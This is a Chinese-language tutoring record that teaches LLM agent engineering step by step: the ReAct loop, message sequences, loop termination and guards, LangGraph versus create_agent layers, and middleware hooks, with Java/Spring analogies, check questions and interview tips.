# Agent 工程逐步辅导记录

> 这个文档的作用：05/06/07/08 四篇信息太密，一次看完记不住也理解吃力。
> 这里用和《LangGraph逐步辅导记录.md》一样的方式：一步一个概念，后端类比，每步结尾出检查题，答对了再走下一步。
> 用法：一次只看一步，答完检查题再继续。不要跳着看。

> 和 LangGraph 文档的关系：LangGraph 文档已经讲过 State/Node/Edge、条件边、循环、recursion_limit、checkpointer、interrupt、Supervisor。
> 这个文档补的是 Agent 工程的「全貌」——把 LangGraph 之外的部分（Middleware、消息模型、工具系统、上下文工程、记忆系统、Streaming、Multi-Agent 五模式、沙箱、可观测性、Deep Agents）也用小步讲透。
> 凡是 LangGraph 文档讲过的，这里只做一两句回顾 + 指路，不重复展开。

---

## 全程路线图

先看全貌，知道一共要走多少步、每步在哪个模块。别被步数吓到，每步都很小。

**第一部分：先把「Agent 是什么」立起来**
- 第1步：Agent 的本质 = while(true) 受控循环
- 第2步：循环里到底跑什么——一次完整执行的消息序列
- 第3步：循环怎么停下来——4 种终止 + 死循环三层防护

**第二部分：框架层级（别再混了）**
- 第4步：LangGraph / create_agent / create_deep_agent 三层关系
- 第5步：万物云为什么选手动 StateGraph 而不直接用 create_agent

**第三部分：Middleware（Agent 的 AOP）**
- 第6步：Middleware 是什么——洋葱模型 + Spring AOP 类比
- 第7步：六个钩子的位置（外层前后 / 模型前后 / 两个 wrap）
- 第8步：wrap_model_call vs before_model（@Around vs @Before）
- 第9步：手写一个真实 Middleware（重试 / Guardrail）+ 生产坑

**第四部分：消息模型**
- 第10步：四种消息类型（System / Human / AI / Tool）
- 第11步：tool_call_id 为什么必须关联

**第五部分：工具系统**
- 第12步：@tool 装饰器做了什么（= @Component + @RequestMapping + Swagger）
- 第13步：工具描述为什么重要（给模型看的 API 文档）
- 第14步：args_schema 参数校验（= @Valid + DTO）
- 第15步：tool_choice 和工具失败处理

**第六部分：上下文工程**
- 第16步：Context Engineering 不是 Prompt Engineering
- 第17步：上下文由什么组成 + 工具定义也占 token
- 第18步：上下文膨胀怎么办（裁剪 / 摘要 / 外移）+ 优先级

**第七部分：记忆系统**
- 第19步：短期记忆 = messages + checkpointer（= HttpSession）
- 第20步：长期记忆 = Store + 主动检索注入（= Redis 用户画像）
- 第21步：任务状态 = State 自定义字段（= 工作流流程变量）
- 第22步：三者正交，一次执行同时存在

**第八部分：HITL、Multi-Agent、上下文工程**
- 第23步：interrupt（interrupt_before + Command resume，万物云人工审核）
- 第24步：Multi-Agent 5 模式（Subagents/Handoffs/Skills/Router/Custom workflow）+ 体系全景
- 第25步：上下文工程（context engineering，Deep Agents 四层）

**第九部分：生产化专题（26-32）**
- 第26步：长期记忆（pgvector + similar merge + TTL，万物云口径）
- 第27步：沙箱（Sandbox / Interpreter / E2B）
- 第28步：可观测 trace（LangSmith / Langfuse / 自研）
- 第29步：MCP（万物云自建，非官方 SDK）
- 第30步：SKILL.md（Deep Agents skill 机制）
- 第31步：planning（write_todos）与反思
- 第32步：部署生产化（并发/限流/checkpointer 膨胀/recursion_limit）

走完这 32 步，从 LangGraph 心智模型到 multi-agent 再到生产化专题，都能用自己的话讲出来。

> **编号说明（重要）**：实际讲解中，原路线图的「第11步 tool_call_id」和「第12步 @tool」合并进了第10步及补充小节。所以从「工具描述」起，实际步数比上图少 2 步：实际第11步=工具描述、第12步=args_schema、第13步=tool_choice、**第14步=上下文工程**……内容一点没少，只是编号前移了 2 步。下面按实际编号继续。

---

## 第一部分：先把「Agent 是什么」立起来

### 第1步：Agent 的本质 = while(true) 受控循环

05 和 06 两篇反复说一句话，这是整门课的地基，必须先死死记住：

> **Agent 本质上是一个受控循环——模型判断要不要调工具，调了就执行再回来，不调就输出结果结束。**

不是比喻，是字面意思。Agent 在底层就是一个 `while(true)`。

#### 后端类比（你最熟的那种）

你写过无数次的 Java 循环：

```java
while (true) {
    Response resp = model.invoke(messages);   // 1. 把上下文喂给模型
    messages.add(resp);

    if (!resp.hasToolCalls()) {                // 2. 模型不调工具 = 干完了
        return resp.getText();                 //    跳出循环，把结果给用户
    }

    for (ToolCall c : resp.getToolCalls()) {   // 3. 模型要调工具，去执行
        Object r = toolExecutor.execute(c);
        messages.add(new ToolMessage(c.getId(), r));   // 4. 工具结果塞回 messages
    }
    // 回到 while 顶部，模型带着工具结果再判断一次
}
```

对应的 Python（LangChain 里 `create_agent` 帮你组装的就是这个东西）：

```python
while True:
    resp = model.invoke(messages)        # 1. 喂上下文
    messages.append(resp)

    if not resp.tool_calls:              # 2. 不调工具 = 完成
        return resp.content

    for call in resp.tool_calls:         # 3. 调工具
        result = run_tool(call)
        messages.append(ToolMessage(result))   # 4. 结果塞回去
    # 回顶部，模型再看一眼工具结果，决定下一步
```

#### 一个最关键的认知转变（05 第三部分「转变一」）

普通 Java `while` 循环：**下一步做什么，是你写死的代码决定的。**

```java
while (有下一条订单) {
    处理订单();   // ← 这一步干什么，你写死了
}
```

Agent 的 `while` 循环：**下一步做什么，是模型在运行时决定的。**

```python
while True:
    resp = model.invoke(messages)   # ← 模型自己决定接下来调不调工具、调哪个
    ...
```

你不再是「写好每一步的代码路径」，而是「设计好循环框架 + 给一堆工具，让模型自己选路走」。这就是 05 说的从「写代码」到「设计循环」的转变。

这就是 ReAct 模式：**推理（Reasoning）→ 行动（Action）→ 观察（Observation），然后循环。**
- 推理 = 模型看上下文想下一步
- 行动 = 调工具
- 观察 = 工具结果回传
- 然后再推理……直到模型觉得不用调工具了，输出文本结束。

#### 生产现实（先打个预防针，细节后面专门讲）

上面这个循环是「最干净的骨架」，生产里远没有这么简单，至少有四个坑（后面都有专门步骤）：

1. **死循环**：模型可能反复调同一个工具停不下来 → 第3步讲三层防护（recursion_limit 你已经在 LangGraph 文档见过 25）
2. **上下文爆炸**：每轮循环 messages 越来越长，最后超模型窗口 → 第18步讲裁剪/摘要
3. **烧钱**：循环越多，模型调用越多，token 费用线性涨 → 生产要监控每轮 token
4. **工具失败**：工具抛异常会直接打断整个循环 → 第15步讲「返回错误信息而不是抛异常」

现在先记最干净的骨架，别被这四个坑带跑。骨架立住了，坑才有地方放。

#### 第1步检查题

用你自己的话说一句：**Agent 的 `while` 循环，和你平时写的 Java `while` 循环，最本质的一个区别是什么？**

答出来再走第2步。

#### 第1步检查题答案（复盘）

你的回答：「终止条件由 agent 自行判断。」

✅ 方向完全正确，抓住了「由模型决定」这个核心。

补精确：终止只是众多决定里的一个。更完整的说法是--普通 Java `while` 里每一步做什么、何时停，都是你写死的代码决定的；Agent `while` 里每一步做什么（调不调工具、调哪个、要不要停），都是模型在运行时决定的。

生产提醒：模型的「自行判断」不可全信，可能陷死循环永远不决定停。所以生产里除了「模型自己判断停」这个默认条件，还有 `recursion_limit`、条件边跳 END、interrupt 等终止条件--那些不是模型判断的，是框架/你兜底的（第3步展开）。

---

### 第2步：循环里到底跑什么--一次完整执行的消息序列

第1步讲了循环的「形状」，这步讲循环里「具体跑什么」。办法是：拿一个真实例子，把每一轮循环时 `messages` 列表的变化一步步摊开看。

#### 例子

用户对客服 Agent 说：「帮我查一下订单 ORD-001，如果没发货就退款，原因是商品不需要了。」

工具只有两个：`search_order`（查订单）、`refund_order`（退款）。

#### 第1轮循环

进入循环时，`messages` 里有 2 条：

```
[0] SystemMessage("你是客服助手。先查订单状态，再决定是否退款...")
[1] HumanMessage("帮我查一下订单 ORD-001，如果没发货就退款...")
```

模型看完，决定**先查订单**，返回：

```
[2] AIMessage(content="好的，我先帮您查询订单状态。",
              tool_calls=[{name: "search_order", args: {order_id: "ORD-001"}, id: "call_a"}])
```

判断：有 tool_calls -> 执行工具。执行 `search_order("ORD-001")`，结果塞回去：

```
[3] ToolMessage(content="订单 ORD-001 状态：已发货", tool_call_id="call_a")
```

回到循环顶部。

#### 第2轮循环

进入循环时，`messages` 里有 **4 条**（第1轮留下的全在）：

```
[0] SystemMessage(...)
[1] HumanMessage(...)
[2] AIMessage(... tool_calls=[search_order] ...)      ← 第1轮模型说的
[3] ToolMessage("已发货")                              ← 第1轮工具结果
```

模型这次看到了「订单已发货」，知道已发货的订单不能直接退款，于是返回：

```
[4] AIMessage(content="您的订单已发货，预计明天到达。已发货订单暂不支持直接退款，建议收货后申请退货退款。")
```

判断：**没有 tool_calls** -> 循环结束，把这段文本返回给用户。

#### 三个必须看明白的点

**1. 每一轮，模型看到的都是「到目前为止的全部消息」，不是只看上一条。**
第2轮模型能看到 [0]~[3] 全部 4 条，包括第1轮它自己说过的话和工具结果。这是 Agent 能「接着上次继续」的基础。

**2. 一轮循环通常往 messages 里加 2 条：一条 AIMessage（模型决定调工具）+ 一条 ToolMessage（工具结果）。**
最后一轮例外：只加 1 条 AIMessage（没有 tool_calls），循环就结束。

**3. messages 是只增不减的（除非你主动裁剪）。**
这联系到 LangGraph 文档讲过的 `add_messages` reducer--messages 字段用 reducer 是「追加」不是「覆盖」，原因就是这里：历史要一路留着给模型看。

#### 后端类比

像一个**不断追加、只增不减的请求日志**。普通 Java 方法调用栈，方法返回栈帧就弹掉了；这里不一样，每一轮的对话和工具结果都留在 messages 里，下一轮整体再读一遍。

#### 生产现实（先记住，细节后面讲）

正是「每轮都看全部历史」这个机制，带来了三个生产坑，后面都有专门步骤：

1. **上下文线性膨胀**：循环 20 轮，messages 就有 40+ 条，token 涨到爆模型窗口 -> 第18步讲裁剪/摘要
2. **`tool_call_id` 必须关联**：[3] 那条 ToolMessage 带的 `tool_call_id="call_a"`，必须对上 [2] 里 tool_calls 的 id。模型一轮可能并发发多个工具调用，不关联就分不清哪个结果对应哪个请求 -> 第11步讲
3. **烧钱**：每轮都把全部历史重发给模型，循环越多 token 费用越高 -> 生产要监控每轮 token

#### 第2步检查题

回到上面那个例子，回答两个问题：

1. **第2轮循环刚开始时，模型看到的 messages 里一共有几条？分别是哪几条？**
2. **为什么是这么多条，而不是只看用户最开始那一条？**

答出来再走第3步。

#### 第2步检查题答案（复盘）

你的回答：
1. 看到 4 条：一开始的 SystemMessage、HumanMessage，加上第1轮的 AIMessage、ToolMessage。
2. 有多轮对话上下文。

✅ 第1问完全正确，4 条数对了：[0]System [1]Human [2]第1轮AIMessage [3]第1轮ToolMessage。

第2问补精确：不只是「有多轮上下文」，而是模型**必须**看到全部历史才能正确决定下一步。第2轮它必须看到第1轮工具返回的「已发货」，才能判断出「已发货不能直接退款」。少看一条，下一步决策就错了。这就是 Agent「接着上次继续」的机制基础，也是上下文会膨胀的根源。

---

### 第3步：循环怎么停下来--4 种终止 + 死循环三层防护

第1步你答了「终止由 agent 自行判断」，这步把「停下来」这件事彻底讲清楚。

#### 4 种终止条件（不只是模型自己停一种）

| # | 终止条件 | 谁决定的 | 常见吗 |
|---|---------|---------|--------|
| 1 | 模型返回纯文本、没有 tool_calls | 模型自己 | 最常见，默认 |
| 2 | 达到 recursion_limit 上限 | 框架兜底 | 防死循环 |
| 3 | 条件边显式路由到 END | 你的代码 | LangGraph 文档讲过 |
| 4 | interrupt 暂停 / 工具抛未捕获异常 | 人工 / 异常 | HITL 场景 |

第1种是「正常结束」，2/3/4 是「兜底」--正因为模型可能不停，才需要这些。

#### 死循环问题：模型一直调同一个工具怎么办

这是生产真实问题。比如用户问一个查不到的订单，模型可能反复 `search_order` 二十次都不死心。万物云用**三层防护**：

**第一层：recursion_limit=25（框架层）**
LangGraph 自带的兜底，最多循环 25 次硬性截断。
注意：这是框架自带的，不是自己发明的，面试要说「用框架自带的兜底并调了阈值」。25 是调过的--太低复杂任务做不完，太高烧钱 + 延迟高。

**第二层：业务层证据增量检测**
每次工具返回后，检查 `scratchpad`（草稿区）有没有新信息。如果连续两次工具调用结果没有实质区别，说明模型陷入重复，注入一条提示引导它换思路，重复 2 次就强制结束。

```python
# 证据增量检测（伪代码）
def check_evidence_increment(state):
    current = state.get("scratchpad", "")
    last = state.get("_last_evidence", "")

    if current == last:                      # 和上次没区别 = 在原地打转
        state["_repeat_count"] = state.get("_repeat_count", 0) + 1
        if state["_repeat_count"] >= 2:
            return Command(goto="end")       # 强制结束
        # 还没到 2 次，先注入提示引导模型换思路
        state["messages"].append(
            SystemMessage("你重复调用了相同工具，结果没新信息，请基于已有信息回答或换查询方式")
        )

    state["_last_evidence"] = current
    return state
```

**第三层：多步检索最多 3 跳**
RAG 场景里防止模型无限检索，最多查 3 跳就停。

#### 后端类比

这就是你写 IoT 后端时防无限重试的同一个思路：**次数限制（recursion_limit）+ 变化检测（证据增量）+ 上限兜底（3 跳）**。三层不是冗余，各管一段：第一层防「停不下来」，第二层防「停下来了但没意义地烧」，第三层防「在检索里无限深挖」。

#### 生产现实

- `recursion_limit` 调多少是权衡：万物云 25 是经验值。面试被问「为什么是 25 不是 10 或 50」要答得出--太低复杂任务做不完、太高烧钱且延迟高，25 是复杂度和成本的平衡点。
- 只靠第一层不够：25 次循环可能已经烧了不少 token 和时间，第二层能在第 2-3 次就发现重复、提前止损。
- 触发兜底要降级：真撞到 recursion_limit 不能直接报错给用户，要返回「任务太复杂，已记录」之类的友好降级（你 LangGraph 文档讲过 `except GraphRecursionError: return too_complex`）。

#### 第3步检查题

`recursion_limit=25` 已经能保证不死循环了，为什么万物云还要加第二层（证据增量检测）和第三层（多步检索最多 3 跳）？只靠第一层会有什么实际问题？

答出来再走第4步。

#### 第3步检查题答案（复盘）

你的回答：「25 层比较深了，可能是已经兜底了；如果第二层和第三层触发可以提前结束。」

✅ 核心抓对了：第一层 recursion_limit 是**最后兜底**，触发时已经烧了 25 轮；第二、三层是为了**提前止损**，在第 2-3 轮就截断，不用等到 25 轮。

补完整「只靠第一层的实际问题」：
1. **浪费成本**：25 轮 = 25 次模型调用 + 25 次工具执行，token 和延迟都白烧
2. **用户体验差**：要等 25 轮跑完才返回失败，前端干等十几秒
3. **抓不住两种失控**：原地打转靠第二层抓，无限深挖靠第三层抓，第一层只数次数，分不清这两种，都得等满 25 次

所以三层各管一段：第一层防停不下来，第二层防原地打转，第三层防无限深挖。

---

### 第3步补充：第三层「多跳检索 3 跳」详解（追问展开）

先分清第二层和第三层防的是**两种不同的失控**：
- 第二层（证据增量）：防「原地打转」--同一个工具反复调，结果一模一样没变化
- 第三层（3 跳）：防「无限深挖」--一直往深处查，结果一直在变，但停不下来

#### 什么是「一跳」

一跳 = 一次检索。Agent 做 RAG 时，调一次检索工具就是一跳。

为什么一次往往不够？因为第一次检索的结果，可能又指向新的查询需求。

#### 万物云例子

用户问：「3栋电梯上次故障是什么原因？」

- 第1跳：检索 3栋电梯的维修记录 → 拿到工单号 WO-2026-0388，但没写故障原因
- 第2跳：拿工单号检索工单详情 → 拿到故障描述「变频器报警」，但没写处理方案
- 第3跳：检索「变频器报警」的标准处理方案 → 拿到完整答案

3 跳，信息够了，综合回答。

#### 失控长什么样

模型可能觉得「再多查一点更全」，追着引用链一直挖：

第4跳：查变频器供应商 → 第5跳：查供应商合同 → 第6跳：查合同付款记录 → ...

每跳结果都在变（所以第二层证据增量检测抓不住--它不是原地打转，结果一直在变），但跟用户问题已经没关系了。这就是「无限深挖」。

#### 后端类比（你最熟的）

这就是你后端常见的两个问题：

1. **对象懒加载引发的 N+1 级联**：查一个实体，它字段又关联别的实体，一直懒加载下去，一次请求拖出半个库。生产里你加 `maxDepth` / `@FetchDepth` 限制深度。
2. **图遍历 / 递归 CTE 没有深度上限**：BFS/DFS 不设 maxDepth 就可能遍历整张图。

**3 跳限制 = 给检索加 `maxDepth=3`**，到了就强制停，用已有信息综合回答。本质和你给懒加载设 fetchDepth 是一回事。

#### 为什么是 3 不是 5 或 10

经验值，跟万物云业务有关：物业报修类问题，3 跳基本能覆盖「记录 → 工单 → 方案」这条链。再多基本是边际信息，性价比低。这个值是调出来的，面试被追问就跟 recursion_limit 一样答「业务调的平衡点」。

#### 生产现实

- 3 跳不是写在 prompt 里求模型别查了，是在图的条件边/节点里**硬判断**：state 里的检索次数计数器 ≥ 3 就路由到综合节点，模型拦不住。
- 触发 3 跳上限也要降级：用已有信息给一个「基于目前查到的」回答，不是报错。
- 它和第二层是互补的：第二层管「结果不变」的循环，第三层管「结果在变但跑偏」的循环。两种都得防。

#### 第3步补充检查题

用一句话说：第二层（证据增量）和第三层（3跳）分别防的是哪种失控？为什么第二层抓不住第三层要防的情况？

答出来再走第4步。

#### 第3步补充检查题答案（复盘）

你的回答：「证据增量防原地打转，第三层防无限深挖，第三层的结果每次都在变。」

✅ 三点全对。第三点「结果每次都在变」正是第二层抓不住第三层的原因--证据增量检测的逻辑是「对比这次和上次的结果，一样就判定打转」；但第三层每次结果都不一样，`current == last` 永远不成立，所以第二层永远触发不了，得靠第三层用次数硬截断。

---

### 第4步：LangGraph / create_agent / create_deep_agent 三层关系

05 里这三层容易混，这步用你最熟的 Spring 分层一下讲清楚。

#### 三层（从底到顶）

| 层 | 名字 | 干什么 | Spring 类比 |
|---|------|--------|------------|
| 底层 | **LangGraph** | 图、State、Node、Edge、条件路由、循环、interrupt、持久化--底层编排骨架 | Spring Framework（手动配 Bean / ApplicationContext） |
| 中层 | **LangChain `create_agent`** | 在 LangGraph 之上帮你组装好标准 ReAct 图，开箱即用 | Spring Boot（自动配置，一键启动） |
| 顶层 | **Deep Agents `create_deep_agent`** | 再封装规划、文件系统、子代理、沙箱、权限等完整能力 | Spring Cloud（全家桶） |

底层都一样，区别只是封装层次。`create_agent` 内部就是用 LangGraph 的 StateGraph 给你搭了个标准 ReAct 图，你不用自己写 node/edge。

#### 版本演进（面试可能问）

- LangChain 1.0 之前：用 LangGraph 的 `create_react_agent`
- LangChain 1.0 之后：用 LangChain 的 `create_agent`（Agent 成了独立子模块）
- `create_deep_agent` 是对 `create_agent` 的再包装

#### 核心权衡（这步的重点）

**封装层级越高 = 开发越快 + 灵活性越低；越低 = 越灵活 + 代码量大、容易出错。**

这跟 Spring 一模一样：
- 用 Spring Boot 写 CRUD，自动配置几行搞定，但你改不了它内部怎么装配
- 要精细控制 Bean 生命周期，你就退回 Spring Framework 手动配

Agent 一样：
- 标准 ReAct（模型+工具+循环）-> 用 `create_agent`，几行起一个 Agent
- 要意图分类、计划、风控分流、人工确认、自定义 State 这种复杂流程 -> 退回 LangGraph 手动建图

#### 生产现实（05 反复强调的一条）

**别「为了写而写」**--高层框架能做的事，优先复用，别自己造一套同类轮子。刘祥宇辅导时多次批评项目"Deep Agents 已有的工具没用好，又自己写了一套"。

面试被问"你们用的哪层"，万物云是**手动 LangGraph StateGraph**（第5步讲为什么）。但要补一句："如果现在做新项目，标准场景我会优先 create_agent，需要文件系统/沙箱等完整能力才上 create_deep_agent"--体现你不是只会底层，是知道选型 trade-off。

#### 第4步检查题

两个场景，分别该用哪一层？为什么不同？

1. 做一个标准客服 Agent：能查订单、能退款，普通 ReAct 循环就行。
2. 做万物云那种：意图分类 + 计划生成 + 风控分流 + 人工确认 + 自定义 State。

答出来再走第5步。

#### 第4步检查题答案（复盘）

你的回答：「1. langchain（create_agent）；2. langgraph（手动 StateGraph）」

✅ 选层完全正确。

补「为什么不同」（题目第二问）：场景1是标准 ReAct（模型+工具+循环），create_agent 开箱即用，用 LangGraph 手动建反而是重新造轮子；场景2需要意图分类、风控分流、计划、人工确认、自定义 State 这种非标准拓扑，create_agent 的固定 ReAct 模板表达不了，必须退回 LangGraph 手动建图拿拓扑控制权。一句话：标准流程用高层省事，定制拓扑用底层拿控制权。

---

### 第5步：万物云为什么选手动 StateGraph 而不直接用 create_agent

接第4步--万物云用的是底层 LangGraph 手动建图。这步讲清「为什么不用更省事的 create_agent」，面试一定会问。

#### 两个原因

**原因1：时间点--create_agent 当时还没发布/不成熟**
LangChain 1.0+ 才有 create_agent，项目启动时它要么没发布、要么不成熟，没法拿来生产用。这是历史客观原因，面试先说这个。

**原因2：需要 create_agent 表达不了的图结构**
万物云的图不是标准 ReAct（模型 <-> 工具 循环），而是：

```
意图分类 -> 风控分流 -> 计划生成 -> 执行(ReAct循环) -> 综合 -> END
                                  ↑              ↓
                                  └── 未完成 ────┘
                       ↓ 高风险
                  人工确认(interrupt)
```

这跟标准 ReAct「模型 <-> 工具 来回循环」拓扑不一样：
- 意图分类节点在模型循环**之前**（先分流再进循环）
- 风控在**路由层**拦截（不进执行循环）
- 多步执行循环 + 综合节点（Plan-and-Execute 骨架）
- interrupt 在自定义位置暂停

create_agent 给你的是固定的 ReAct 模板，加 middleware/hooks 能加横切逻辑，但改不了「先分类 -> 风控 -> 计划 -> 执行 -> 综合」这个拓扑。所以退回 LangGraph 手动建图。

#### 后端类比

Spring Boot 自动配置够你写 CRUD，但要做有定制生命周期的复杂流程引擎，自动配置装配不出你要的结构，就退回 Spring Framework 手动配 Bean 和生命周期。万物云要的就是定制拓扑，所以手动建图。

#### 面试官可能追问（提前准备）

> ⏸ **现在先跳过这一段**。它用了 `middleware` 和 `state_schema` 两个概念，middleware 要到第6-9步才讲。等你学完 Middleware 再回来看，现在看不懂是正常的，别卡这里。

**"create_agent 也支持 middleware 和 state_schema 扩展啊，为什么还不够？"**

答：middleware 和 state_schema 能加横切逻辑和自定义字段，但 create_agent 的**图拓扑**（哪些节点、怎么路由、在哪 interrupt）是固定的 ReAct 模板。万物云需要「意图分类在循环前、风控在路由层、Plan-and-Execute 骨架 + 综合节点」这种非标准拓扑，固定模板表达不了。手动建图就是为了拿拓扑控制权。

#### 一定要补的一句（体现 trade-off）

别把「手动建图」说成多牛的选择。要补：「手动建图灵活但代码量大、容易出错；如果现在做新项目，标准 ReAct 场景我会优先 create_agent，只有需要定制拓扑才退回 LangGraph。」体现你懂选型权衡，不是为底层而底层。

#### 第5步检查题

万物云选手动 StateGraph 而不是 create_agent，有哪两个原因？其中哪个是「create_agent 做不到」的硬原因，哪个是「当时做不到」的时间原因？

答出来再走第6步。

#### 第5步检查题答案（复盘）

你的回答：
- 图拓扑类似责任链设计模式
- create_agent 只是创建一个 agent，参数传 middleware/tool 等；实际可能涉及多个 agent 或完整编排流程，所以不够

✅ 理解方向对，而且「create_agent = 单个 agent，复杂编排要多个节点/agent」这个框架比我给的更直白，是很好的理解。

补三点：
1. **硬原因你抓到了**：create_agent 产出的是「一个 ReAct agent」，参数（middleware/tool）都是给这一个 agent 加东西；万物云要的是「多个节点编排成一条流程」，这已经不是「一个 agent」的事，是图/工作流的事，所以用 LangGraph。
2. **时间原因你没提**：create_agent 是 LangChain 1.0+ 才有，项目启动时还没发布/不成熟，这是另一个独立原因。面试两个都要说。
3. **责任链要打补丁**：线性主链（分类->风控->计划->执行->综合）确实像责任链；但责任链是纯线性「处理或传递」，万物云还有条件分支（风控分两路）和循环（执行未完成回执行），责任链表达不了。更准确说是「责任链的线性骨架 + 状态机/工作流的分支循环」，整体更接近 Activiti 工作流。

---

### 第6步：Middleware 是什么--洋葱模型 + Spring AOP

接下来几步（6-9）讲 Middleware，这是 05 反复强调「必须记住」的概念。这步只讲「Middleware 是什么」，六个钩子的具体位置放下一步（第7步），别一次吞。

#### 一句话：Middleware 是 Agent 的 AOP

你在 Spring 里用 `@Around`/`@Before`/`@After` 在方法前后插横切逻辑（日志/鉴权/事务），不改动业务方法本身。Agent 的 Middleware 是一模一样的思想：

> 不改 Agent 的核心循环（第1步那个 while），在循环的不同位置插横切逻辑--日志、鉴权、重试、限流、Guardrail、审计。

05 的原话：Middleware 就是 Spring AOP 的 `@Around`/`@Before`/`@After`，不需要修改 Agent 循环的核心代码，只在循环的不同位置插入横切逻辑。

#### 洋葱模型

请求像穿洋葱，一层层进去，到核心（模型/工具），再一层层出来。每层都能在「进去前」和「出来后」做点事。

```
请求 -> [外层 MW] -> [中层 MW] -> 模型/工具 -> [中层 MW] -> [外层 MW] -> 响应
        (进前/出后)    (进前/出后)              (出后/进前)   (出后/进前)
```

后端类比：这就是 **Servlet Filter 链 / Spring HandlerInterceptor 链**。一个 HTTP 请求穿过多层 Filter，每层 `doFilter` 前后能加逻辑。完全一个东西。

#### 三个关键认知

- Middleware **不改核心循环**，是「套在外面」的。跟 AOP 不改业务方法一个道理。
- 多个 Middleware **嵌套**执行（洋葱），不是平行。外层包内层。
- 它能直接拿到 request/response/state 并修改。

#### 生产现实（先记一条，细节第9步讲）

万物云用 Middleware 做了：鉴权、上下文裁剪、重试、工具权限审计、Guardrail 脱敏、审计日志。这些都是横切关注点，**不该塞进业务节点里**--塞进去节点就脏了、难复用、难维护，跟你 Java 里把日志写进每个 Service 方法是一个毛病。

#### 第6步检查题

用一句话说：Agent 的 Middleware 和 Spring 的什么机制是一回事？它最大的特点是什么（跟直接改业务代码比）？

答出来再走第7步。

#### 第6步检查题答案（复盘）

你没有直接回答，而是追问了五个实际问题：middleware 在哪注册 / 何时触发 / 多个的顺序 / 自带的有哪些 / 自定义的业务场景。这些问题本身就是对 Middleware 的深度理解，下面展开回答。

---

### 第6步补充：Middleware 实际怎么用（追问展开）

#### Q1：在哪注册？只能 create_agent 参数吗？

主要方式就是 `create_agent` 的 `middleware=[...]` 参数：

```python
agent = create_agent(
    model=...,
    tools=...,
    middleware=[AuthMiddleware(), RetryMiddleware(), ...]
)
```

90% 场景就是这样传进去。注册后，这个 agent **每次跑都自动带上这些横切逻辑**，不用你在业务节点里手动调。也支持运行时动态加减，但本质一样。所以理解为：**middleware 是 create_agent 的配置项。**

#### Q2：什么时候触发？是不是 agent 前后必定触发？

**不是都「agent 前后」--这是关键纠正。** 六个钩子触发频率分三档：

| 触发频率 | 钩子 | 什么时候跑 |
|---------|------|-----------|
| 整个 agent 跑一次（最外层） | before_agent / after_agent | agent 开始前一次 / 结束后一次 |
| 每轮循环跑（模型前后） | before_model / after_model / wrap_model_call | 每次调模型前/后/包住 |
| 每次工具调用跑 | wrap_tool_call | 每次调工具时包住 |

所以「必定触发前后」只对 before_agent/after_agent 成立。其他四个是**循环内每轮 / 每次工具**触发。第1步那个 while 跑 5 轮，before_model 就跑 5 次。

#### Q3：多个 middleware 执行顺序？

洋葱嵌套，按注册顺序：**先注册的在外层（先进入、最后离开）**，跟 Servlet Filter 链 `addInterceptor` 顺序一致。

```
注册顺序 [A, B, C]
进入： A进 -> B进 -> C进 -> 模型 -> C出 -> B出 -> A出
before_* 顺序：A, B, C（外到内）
after_*  顺序：C, B, A（内到外）
```

所以最外层的（如鉴权 Auth）放第一个，它最先挡、最后收尾。

#### Q4：LangChain 自带的 middleware

| 自带 | 干什么 | 哪个钩子 |
|------|--------|---------|
| SummarizationMiddleware | 消息太多时自动把旧消息摘要压缩 | before_model |
| HumanInTheLoopMiddleware | 关键步骤暂停等人工审批 | 内部用 interrupt |
| 调用次数/额度限制 | 限制模型或工具调用次数，防滥用 | before_model / wrap |
| Sub-agent Middleware | 管理子 agent 调用和结果 | wrap |

注意：你说的 **filesystem 不是 create_agent 的 middleware**，那是 Deep Agents 的能力（`create_deep_agent(file_system=True)`），第34步讲，别混。

#### Q5：自定义 middleware 的实际业务场景（万物云六个，正好对应六个钩子）

这是你最想懂的。万物云自定义了六个，一个钩子一个：

1. **AuthMiddleware（before_agent）**--agent 开始前鉴权 + 加载用户偏好。整个 agent 跑一次。
   场景：请求进来先验 token、查权限，没权限直接拒，不进循环。
   类比：Spring 的 SecurityFilter，进门先验身份。

2. **ContextInjectionMiddleware（before_model）**--每轮调模型前注入动态信息 + 裁剪上下文。每轮都跑。
   场景：注入当前时间、用户所属物业项目；消息超 20 条就裁剪保留最近 15 条。
   类比：HandlerInterceptor 的 preHandle，每次请求前加公共参数。

3. **RetryMiddleware（wrap_model_call）**--包住每次模型调用，失败自动重试（指数退避）。每次调模型都包。
   场景：模型 API 偶发超时/限流，重试 3 次别直接失败。
   类比：Spring Retry 的 `@Retryable`，或 `@Around` 包住 RPC 加重试。

4. **ToolGuardMiddleware（wrap_tool_call）**--包住每次工具调用，做权限检查 + 审计日志。每次调工具都包。
   场景：非管理员不能调「删除设备」工具；每次工具调用记审计日志。
   类比：`@Around` 包住 DAO 方法做权限 + 审计。

5. **GuardrailMiddleware（after_model）**--每次模型返回后做内容安全检查 + 脱敏。每轮都跑。
   场景：模型输出里出现身份证号/银行卡号就脱敏；检测到危险建议就拦截。
   类比：`@AfterReturning`，方法返回后改返回值（脱敏）。

6. **AuditMiddleware（after_agent）**--整个 agent 结束后记审计日志。agent 跑一次。
   场景：记录这次调用的 trace_id、用户、意图、调了哪些工具、耗时、最终回答。
   类比：`@After` 或 Filter 销毁阶段，请求结束记访问日志。

**一句话总结**：before_* 是进门/进循环前，after_* 是出门/出循环后，wrap_* 是包住单次调用能重试/改参数/改结果。万物云把鉴权/裁剪/重试/工具权限/脱敏/审计这六个横切关注点各放一个钩子，业务节点只管业务逻辑，干净。

#### 自定义 middleware 长啥样（第9步写完整代码，先看骨架）

```python
from langchain.agents import AgentMiddleware

class AuthMiddleware(AgentMiddleware):
    async def before_agent(self, request, state):
        user_id = state.get("user_id")
        if not await check_permission(user_id):
            raise PermissionError("无权限")
        return request   # 可以改 request 后返回
```

继承 AgentMiddleware，重写你要的钩子。跟 Spring 实现 HandlerInterceptor 重写 preHandle/postHandle 一个写法。

#### 第6步补充检查题

万物云六个自定义 middleware 里，哪几个是「整个 agent 跑一次」，哪几个是「每轮循环跑」？为什么 RetryMiddleware 要用 wrap_model_call 而不是 before_model？

答出来再走第7步。

#### 第6步补充二：`wrap_*` 的「包住」到底是什么（= Spring @Around）

你问的「包住」就是 wrap_model_call / wrap_tool_call 跟 before_model 的本质区别。一句话：**before_* 只能在调用前做事，「调模型」这个动作不归你管；wrap_* 把「调模型」这个动作交给你，你决定调不调、调几次、调完怎么处理。**

#### before_model vs wrap_model_call（用重试说清）

before_model 像 `@Before`：你跑一段逻辑，然后框架照常调一次模型。你控制不了「调模型」这个动作，所以**做不了重试**：

```python
async def before_model(self, request, state):
    # 这里跑完，框架就调模型（就调一次）
